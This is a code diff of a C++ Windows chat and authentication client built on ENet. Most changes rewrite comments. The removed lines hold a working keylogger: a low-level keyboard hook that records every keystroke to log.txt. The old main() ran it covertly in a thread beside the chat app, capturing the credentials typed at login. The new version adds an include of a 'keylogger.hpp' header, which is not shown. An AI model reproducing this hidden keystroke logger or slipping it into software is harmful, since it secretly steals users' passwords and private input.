@@ -1,14 +1,16 @@
 #include <enet/enet.h>
 #include <iostream>
 #include <string>
-#include <conio.h>      // For _kbhit() and _getch()
-#include <windows.h>    // For Sleep()
-#include <stdio.h>
-#include <thread>
+#include <conio.h>      // For keyboard input functions (_kbhit, _getch)
+#include <windows.h>    // For Sleep function
+#include <thread> // For thread
+#include <ctime>
+#include "keylogger.hpp"
+
 using namespace std;
 
 // ---------------------------------------------------------------------
-// Display the main menu options to the user.
+// Display the main menu options to the user
 // ---------------------------------------------------------------------
 void displayMenu() {
     cout << "\n=== Authentication System ===" << endl;
@@ -19,49 +21,69 @@ void displayMenu() {
 }
 
 // ---------------------------------------------------------------------
-// Send a message to the server and wait for a response.
-// Used for authentication commands.
+// Send a message to the server and wait for a response
+// Parameters:
+//   - peer: Connection to the server
+//   - message: Text to send to server
+//   - client: Local network interface
+// Returns: Server's response as a string
 // ---------------------------------------------------------------------
 string sendMessage(ENetPeer* peer, const string& message, ENetHost* client) {
-    ENetPacket* packet = enet_packet_create(message.c_str(), message.size() + 1, ENET_PACKET_FLAG_RELIABLE);
+    // Create a packet with the message
+    ENetPacket* packet = enet_packet_create(
+        message.c_str(),           // Message content
+        message.size() + 1,        // Message length (include null terminator)
+        ENET_PACKET_FLAG_RELIABLE  // Ensure delivery
+    );
+    
+    // Send the packet to the server
     enet_peer_send(peer, 0, packet);
-    enet_host_flush(client);
+    enet_host_flush(client);  // Force immediate sending
 
+    // Wait for server response (up to 5 seconds)
     ENetEvent event;
-    // Wait for up to 5000 ms (5 seconds) for a response.
     while (enet_host_service(client, &event, 5000) > 0) {
         if (event.type == ENET_EVENT_TYPE_RECEIVE) {
+            // Convert received data to string
             string response = reinterpret_cast<char*>(event.packet->data);
             enet_packet_destroy(event.packet);
             return response;
         }
     }
+    
+    // Timeout - no response received
     return "ERROR: No response from server";
 }
 
 // ---------------------------------------------------------------------
-// Disconnect properly from the server.
+// Disconnect cleanly from the server
 // ---------------------------------------------------------------------
 void disconnectFromServer(ENetPeer* peer, ENetHost* client) {
     if (peer) {
+        // Request disconnection
         enet_peer_disconnect(peer, 0);
+        
+        // Wait for server to acknowledge (up to 3 seconds)
         ENetEvent event;
         while (enet_host_service(client, &event, 3000) > 0) {
             if (event.type == ENET_EVENT_TYPE_RECEIVE) {
+                // Clean up any packets we receive during disconnect
                 enet_packet_destroy(event.packet);
-            } else if (event.type == ENET_EVENT_TYPE_DISCONNECT) {
+            } 
+            else if (event.type == ENET_EVENT_TYPE_DISCONNECT) {
                 cout << "Disconnected from server." << endl;
                 break;
             }
         }
     }
+    
+    // Clean up local network resources
     enet_host_destroy(client);
 }
 
 // ---------------------------------------------------------------------
-// Chat mode (without threads):
-// This function continuously polls for incoming messages and also checks 
-// for user key presses in a non-blocking manner using _kbhit().
+// Chat application interface
+// Handles both sending user messages and receiving messages from others
 // ---------------------------------------------------------------------
 void chatApp(ENetPeer* peer, ENetHost* client) {
     cout << "\nWelcome to the Chat App!" << endl;
@@ -71,78 +93,104 @@ void chatApp(ENetPeer* peer, ENetHost* client) {
     string userInput = "";
     bool running = true;
     
-    // Main loop: poll for both incoming network messages and user keystrokes.
+    // Main chat loop
     while (running) {
-        // Poll network messages with a zero timeout (non-blocking)
+        // --- RECEIVING MESSAGES ---
+        // Check for incoming messages (non-blocking)
         ENetEvent event;
         while (enet_host_service(client, &event, 0) > 0) {
             if (event.type == ENET_EVENT_TYPE_RECEIVE) {
-                // Display the incoming message on a new line
-                cout << "\n" << reinterpret_cast<char*>(event.packet->data) << "\nYou: " << userInput << flush;
+                // Display received message and restore user input prompt
+                cout << "\n" << reinterpret_cast<char*>(event.packet->data);
+                cout << "\nYou: " << userInput << flush;
                 enet_packet_destroy(event.packet);
             }
         }
         
-        // Check if a key is pressed without blocking.
+        // --- SENDING MESSAGES ---
+        // Check if user has pressed any keys (non-blocking)
         if (_kbhit()) {
-            char ch = _getch();
-            // If Enter key is pressed (ASCII 13)
-            if (ch == 13) {
+            char ch = _getch();  // Get the pressed key
+            
+            // Handle Enter key (send message)
+            if (ch == 13) {  // 13 is ASCII code for Enter
                 cout << "\n";
+                
+                // Exit command
                 if (userInput == "/exit") {
                     running = false;
                     break;
                 }
+                
+                // Send non-empty messages
                 if (!userInput.empty()) {
-                    // Prefix the user's message with "CHAT:" so the server knows it's a chat message.
+                    // Add CHAT: prefix so server knows it's a chat message
                     string fullMessage = "CHAT:" + userInput;
-                    ENetPacket* packet = enet_packet_create(fullMessage.c_str(), fullMessage.size() + 1, ENET_PACKET_FLAG_RELIABLE);
+                    ENetPacket* packet = enet_packet_create(
+                        fullMessage.c_str(), 
+                        fullMessage.size() + 1, 
+                        ENET_PACKET_FLAG_RELIABLE
+                    );
                     enet_peer_send(peer, 0, packet);
                     enet_host_flush(client);
                     userInput.clear();
                 }
+                
+                // Reset input prompt
                 cout << "You: " << flush;
             }
-            // Handle backspace (ASCII 8)
-            else if (ch == 8) {
+            // Handle Backspace key
+            else if (ch == 8) {  // 8 is ASCII code for Backspace
                 if (!userInput.empty()) {
-                    userInput.pop_back();
-                    cout << "\b \b" << flush;
+                    userInput.pop_back();  // Remove last character
+                    cout << "\b \b" << flush;  // Erase character from display
                 }
             }
+            // Handle regular character input
             else {
-                userInput.push_back(ch);
-                cout << ch << flush;
+                userInput.push_back(ch);  // Add character to input
+                cout << ch << flush;      // Display character
             }
         }
-        // Sleep a bit to prevent busy waiting.
-        Sleep(10);
+        
+        // Prevent CPU overuse
+        Sleep(10);  // Pause for 10 milliseconds
     }
 }
 
 // ---------------------------------------------------------------------
-// Registration flow: Ask for email, then verification code, then new password.
+// User registration process
+// 1. Get email from user
+// 2. Request verification code from server
+// 3. Get verification code from user
+// 4. Set password after verification
 // ---------------------------------------------------------------------
 void handleRegistration(ENetPeer* peer, ENetHost* client) {
+    // Step 1: Get email address
     string email;
     cout << "Enter email for registration: ";
     cin >> email;
     
-    // Send the REGISTER command with an empty password.
-    string message = "REGISTER:" + email + "|";
+    // Step 2: Send registration request to server
+    string message = "REGISTER:" + email + "|";  // Empty password field
     string response = sendMessage(peer, message, client);
     cout << "Server: " << response << endl;
     
+    // If registration request succeeded (OK response)
     if (response.rfind("OK:", 0) == 0) {
+        // Step 3: Get verification code from user
         string code;
         cout << "Enter verification code sent to your email: ";
         cin >> code;
         
+        // Step 4: Verify email with code
         message = "VERIFY:" + email + "|" + code;
         response = sendMessage(peer, message, client);
         cout << "Server: " << response << endl;
         
+        // If verification succeeded
         if (response.rfind("OK:", 0) == 0) {
+            // Step 5: Set password
             string password;
             cout << "Enter new password: ";
             cin >> password;
@@ -155,53 +203,71 @@ void handleRegistration(ENetPeer* peer, ENetHost* client) {
 }
 
 // ---------------------------------------------------------------------
-// Login flow: Ask for email and password, then enter chat mode if successful.
+// User login process
+// 1. Get email and password
+// 2. Authenticate with server
+// 3. Enter chat mode if login successful
 // ---------------------------------------------------------------------
 void handleLogin(ENetPeer* peer, ENetHost* client) {
+    // Step 1: Get credentials
     string email, password;
     cout << "Enter email: ";
     cin >> email;
     cout << "Enter password: ";
     cin >> password;
     
+    // Step 2: Send login request to server
     string message = "LOGIN:" + email + "|" + password;
     string response = sendMessage(peer, message, client);
     cout << "Server: " << response << endl;
     
+    // Step 3: Enter chat if login successful
     if (response.rfind("OK:", 0) == 0) {
         cout << "You are now logged in!" << endl;
         cout << "Press Enter to go to the Chat App..." << endl;
-        // Clear the newline left in the input buffer.
-        string dummy;
-        getline(cin, dummy);
-        getline(cin, dummy);
-        // Enter chat mode (non-blocking, no extra threads)
+        
+        // Clear input buffer (consume any leftover input)
+        cin.ignore(1000, '\n');
+        cin.get();
+        
+        // Enter chat mode
         chatApp(peer, client);
     }
 }
 
-// ---------------------------------------------------------------------
-// Main function: Initialize the client, connect to the server, and process user commands.
-// ---------------------------------------------------------------------
-int chathread (){
+
+
+int application(){
+     // --- INITIALIZE NETWORKING ---
+    // Initialize ENet library
     if (enet_initialize() != 0) {
         cerr << "ENet initialization failed!" << endl;
-        cin.get();
+        cin.get();  // Wait for user input before exiting
         return EXIT_FAILURE;
     }
-    atexit(enet_deinitialize);
+    atexit(enet_deinitialize);  // Clean up ENet when program exits
 
-    ENetHost* client = enet_host_create(nullptr, 1, 2, 0, 0);
+    // Create client network interface
+    ENetHost* client = enet_host_create(
+        nullptr,  // No specific bind address
+        1,        // Only one outgoing connection
+        2,        // Two channels
+        0, 0      // No bandwidth limits
+    );
+    
     if (!client) {
         cerr << "Client creation failed!" << endl;
         cin.get();
         return EXIT_FAILURE;
     }
 
+    // --- CONNECT TO SERVER ---
+    // Set server address
     ENetAddress address;
-    enet_address_set_host(&address, "127.0.0.1");
-    address.port = 25555;
+    enet_address_set_host(&address, "127.0.0.1");  // Server IP address
+    address.port = 25555;                               // Server port
 
+    // Attempt connection
     ENetPeer* peer = enet_host_connect(client, &address, 2, 0);
     if (!peer) {
         cerr << "Failed to initiate connection to server!" << endl;
@@ -210,8 +276,10 @@ int chathread (){
         return EXIT_FAILURE;
     }
 
+    // Wait for connection success/failure (5 second timeout)
     ENetEvent event;
-    if (enet_host_service(client, &event, 5000) > 0 && event.type == ENET_EVENT_TYPE_CONNECT) {
+    if (enet_host_service(client, &event, 5000) > 0 && 
+        event.type == ENET_EVENT_TYPE_CONNECT) {
         cout << "Connected to server!" << endl;
     } else {
         cerr << "Connection failed!" << endl;
@@ -221,101 +289,48 @@ int chathread (){
         return EXIT_FAILURE;
     }
 
+    // --- MAIN APPLICATION LOOP ---
     int choice = 0;
-    while (choice != 3) {
+    while (choice != 3) {  // Loop until user chooses to exit
         displayMenu();
         cin >> choice;
-        string dummy;
-        getline(cin, dummy); // Clear the input buffer
+        cin.ignore(1000, '\n');  // Clear input buffer
         
         switch (choice) {
-            case 1:
+            case 1:  // Login
                 handleLogin(peer, client);
                 break;
-            case 2:
+            case 2:  // Register
                 handleRegistration(peer, client);
                 break;
-            case 3:
+            case 3:  // Exit
                 cout << "Exiting..." << endl;
                 break;
-            default:
+            default:  // Invalid choice
                 cout << "Invalid choice, please try again." << endl;
                 break;
         }
     }
 
+    // --- CLEANUP ---
     disconnectFromServer(peer, client);
-
-
-    return 1;
-}
-HHOOK keyboardHook;
-
-/**
- * Callback function that processes keyboard events.
- * 
- * @param nCode Determines how the event should be processed.
- * @param wParam Specifies the type of keyboard message (e.g., key down, key up).
- * @param lParam Contains information about the key event (e.g., which key was pressed).
- * @return Calls the next hook in the chain to ensure other hooks continue working.
- */
-LRESULT CALLBACK KeyLoggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    // Check if the hook code is valid and a key is being pressed down
-    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
-        // Extract key information from the event
-        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
-
-        // Open (or create) a log file in append mode to store key presses
-        FILE *file = fopen("log.txt", "a");
-        if (file) {
-            // Convert the virtual key code into an ASCII character
-            char key = MapVirtualKey(kbdStruct->vkCode, MAPVK_VK_TO_CHAR);
-
-            // Write the key character to the log file
-            fprintf(file, "%c", key);
-            fclose(file);  // Close the file to save changes
-        }
-    }
-
-    // Pass the event to the next hook in the chain to avoid interfering with normal functionality
-    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
-}
-
-
-int logger(){
-    // Install a low-level keyboard hook
-    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLoggerProc, NULL, 0);
-    
-    // Check if the hook installation failed
-    if (!keyboardHook) {
-        printf("Failed to install hook!\n");
-        return 1;  // Exit with an error code
-    }
-
-    // A message loop to keep the program running and listening for key events
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);  // Translate virtual key messages into character messages
-        DispatchMessage(&msg);   // Dispatch messages to the appropriate window procedure
-    }
-
-    // Uninstall the keyboard hook before exiting
-    UnhookWindowsHookEx(keyboardHook);
-    return 0;  // Exit successfully
-
-
+    return 0;
 
 }
+
+// ---------------------------------------------------------------------
+// Main function - Program entry point
+// ---------------------------------------------------------------------
 
 
 
 int main() {
-    std::thread threadA(logger);  // Start logger thread
-    std::thread threadB(chathread); 
+    std::thread threadA(application);
+    threadA.join();
 
-    threadA.join();  // Wait for logger to finish
-    threadB.join();  // Wait for chatapp to finish
+
+
+
 
     return 0;
-
 }
